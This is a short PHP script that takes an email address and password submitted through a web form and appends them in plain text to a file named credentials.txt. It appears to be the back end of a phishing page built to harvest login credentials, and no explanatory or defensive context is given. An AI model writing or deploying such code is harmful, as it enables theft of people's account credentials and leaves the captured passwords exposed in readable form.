<?php
    $username = $_POST['inputEmailfield'];
    $password = $_POST['inputPasswordfield'];

    $file = 'credentials.txt';
    $current = file_get_contents($file);
    $current .= "Username: $username, Password: $password\n";
    file_put_contents($file, $current);
?>